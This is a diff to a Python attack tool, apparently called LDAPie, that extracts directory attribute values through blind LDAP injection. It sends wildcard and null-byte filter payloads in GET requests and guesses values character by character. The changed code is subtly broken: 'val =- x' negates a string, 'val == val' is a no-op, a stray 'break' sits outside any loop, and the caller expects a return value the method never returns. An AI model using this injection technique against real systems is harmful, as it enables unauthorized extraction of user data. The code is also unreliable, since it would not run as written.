@@ -71,10 +71,17 @@ class LDAPie:
         for i in range(len(char)):
             for x in char:
                 bf = requests.get(url+'='+user+'*)('+inj+'='+val+x+"*))%00")
-                print(bf.url)
-                if user in bf.content:
+#                print(bf.url)
+                if user not in bf.content:
+                    val =- x
+                    val == val
+                else:
                     val += x
                     break
+        r = requests.get(url+'='+user+'*)('+inj+'='+val+'))%00')
+        if user in r.content:
+            print(val)
+        break
 #main
 #SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
 post = False
@@ -123,7 +130,8 @@ if post == True:
 if get == True:
     inj = m.get(wordlist,user,url)
     for x in inj:
-        m.bruteforce(x,user,url)
+        val = m.bruteforce(x,user,url)
+        print('\033[1;31mThe Value of '+x+' is '+val)
     pass
 
 elif get == False or post == False:
